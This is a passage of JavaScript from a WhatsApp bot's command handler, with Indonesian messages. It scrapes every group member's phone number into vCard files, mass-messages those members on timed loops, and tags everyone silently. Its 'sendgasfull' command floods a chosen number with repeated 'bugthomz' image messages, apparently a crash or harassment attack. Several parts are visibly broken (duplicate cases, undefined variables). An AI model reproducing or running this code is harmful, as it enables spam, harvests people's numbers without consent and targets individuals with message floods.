await haikal.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL BANG THOMZ✅*")
}
break
case "pushkontakid":{
if (!isOwner) return reply(`Khusus Bang Thomz`)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
reply(mess.wait)
const groupMetadataa = !isGroup? await haikal.groupMetadata(`${text.split("|")[0]}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkon = text.split("|")[1]
if (isContacts) return
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await haikal.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await haikal.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(4000)
} else {
await haikal.sendMessage(mem, { text: global.tekspushkon })
await sleep(4000)
}
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:thomz[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await haikal.sendMessage(from, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case "pushkontakgc":{
if (!isOwner) return reply(`Khusus Bang Thomz`)
if (!isGroup) return reply(mess.only.group)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)
reply(mess.wait)
const groupMetadata = isGroup? await haikal.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv2 = text
if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await haikal.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await haikal.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
await sleep(3000)
} else {
await haikal.sendMessage(men, { text: global.tekspushkonv2 })
await sleep(3000)
}
}
reply("File Kontak Sudah Di Kirim Lewat Chat Pribadi")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:thomz[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await haikal.sendMessage(sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
    case 'save': {
if (!isOwner) return reply(mess.only.owner)
let t = text.split('|');
if (t.length < 2) return reply(`*Format salah!*

Penggunaan:
${prefix + command} .nama pake titik sebelum nama yah bang thomz`);
let nama = t[0];
let nominal = t[1];
        reply(mess.save)
reply(`𝕊𝕐𝕊𝕋𝔼𝕄 𝕊𝔸𝕍𝔼 𝕆𝕋𝕆𝕄𝔸𝕋𝕀𝕊 𝔻𝕆ℕ𝔼✅

𝕂𝕆ℕ𝕋𝔸𝕂 : ${nominal}

𝕁𝔸ℕ𝔾𝔸ℕ 𝕃𝕌ℙ𝔸 𝕊𝔸𝕍𝔼 𝔹𝔸ℂ𝕂 ${botname} 𝕐𝕆𝕆`)
}
        break        
case "pushkontakidjd":
if (!isOwner) return reply(`Khusus Bang Thomz`)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|jeda|teks\nUntuk Liat Id Group Silahkan Ketik .idgroup`)
await reply("Laksanakan Bang Thomz")
const groupMetadataa = !isGroup? await haikal.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
const participantss = !isGroup? await groupMetadataa.participants : ""
const halls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv3 = q.split("|")[2]
for (let mem of halls) {
if (/image/.test(mime)) {
media = await haikal.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await haikal.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv3 })
await sleep(q.split("|")[1])
} else {
await haikal.sendMessage(mem, { text: global.tekspushkonv3 })
await sleep(q.split("|")[1])
}
}
reply("Succes Bang Thomz!")
break
case "pushkontakgcjd":
if (!isOwner) return reply(`Khusus Bang Thomz`)
if (!isGroup) return reply(mess.only.group)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} jeda|teks`)
await reply("Laksanakan Bang Thomz")
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv4 = text.split("|")[1]
for (let men of halsss) {
if (/image/.test(mime)) {
media = await haikal.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await haikal.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv4 })
await sleep(text.split("|")[0])
} else {
await haikal.sendMessage(men, { text: global.tekspushkonv4 })
await sleep(text.split("|")[0])
}
}
reply("Succes Bang Thomz!")
break
case "savecontactgc": {
if (!isOwner) return reply(`Khusus Bang Thomz`)
if (!isGroup) return reply(mess.only.group)
if (!text) return reply(`Maaf Kak Fitur ${prefix+command} Hanya Bisa Di Gunakan Di Dalam Group\nUntuk Memasukan Bot Ke Dalam Group Yang Di Ingin Kan\nSilahkan Ketik Command .join linkgroup`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const groupMetadata = isGroup? await haikal.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (isContacts) return
contacts.push(men)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}
reply("Sukses File Sudah Di Kirim Lewat Chat Private")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:thomz[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await haikal.sendMessage(sender, { document: fs.readFileSync("./data/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case 'infogc': case 'getkontak':
if (!isOwner) return reply(`Khusus Bang Thomz`)
if (!isGroup) return m.reply(`Khusus Group Kontol`)
huhuhs = await haikal.sendMessage(m.chat, {
    text: `GRUP: *${groupMetadata.subject}*\nID :* ${groupMetadata.id}\nMEMBER: *${participants.length}\n\n${groupMetadata.desc}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) // (?); mengirim kontak seluruh member
reply
break
case 'idgc': case 'getkontak':
if (!isOwner) return reply(`Khusus Bang Thomz`)
if (!isGroup) return m.reply(`Khusus Group Kontol`)
huhuhs = await haikal.sendMessage(m.chat, {
    text: `*ID :* ${groupMetadata.id}\n\nJangan Lupa Di Salin Idnya Yah Bang Thomz*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) // (?); mengirim kontak seluruh member
reply
break
case 'savekontak': case 'svkontak':
if (!isOwner) return reply(`Khusus thomz store Aja`)
if (!isGroup) return m.reply(`Khusus Group Kontol`)
let cmiggc = await haikal.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
} // (?); mengimpor kontak seluruh member - save
let nmfilect = './contacts.vcf'
reply('*Mengimpor '+cmiggc.participants.length+' kontak..*')
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
haikal.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'GROUP: *'+cmiggc.subject+'*\nMEMBER: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)
break
case 'sendkontak': case 'kontak':
if (!isOwner) return reply(`Khusus Bang Thomz`)
if (!isGroup) return m.reply(`Khusus Group`)
if (!m.mentionedJid[0]) return reply('Ex; .kontak @tag|nama')
let snTak = dtext.split(' ')[1] ? dtext.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} // (?); send kontak
haikal.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
break
case "savecontactid": {
if (!isOwner) return reply(`Khusus Bang Thomz`)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const groupMetadataa = !isGroup? await haikal.groupMetadata(`${text}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await haikal.sendMessage(from, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case "hidetag": {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!text) return reply("Teks Nya Mana Kak?")
global.txhtg = text
haikal.sendMessage(from, { text : global.txhtg , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
break
case "tagall": {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isOwner) return reply(`Maaf Fitur Ini Hanya Bisa Digunakan Oleh Admin Group`)
if (!q) return reply(`Teks nya mana mek ?`)
let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n⌜ TAGG KABEHAN BY THOMZ ⌟\n`
for (let mem of participants) {
teks += `⊝ @${mem.id.split('@')[0]}\n`
}
haikal.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'sendgasfull' :  case '🐵':{
 if (!isOwner) return m.reply('*khusus Bang Thomz*')
 if (!text) return reply(`penggunaan salah thomz harusnya ${prefix+command} 628xxx `)
 await reply(mess.wait)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
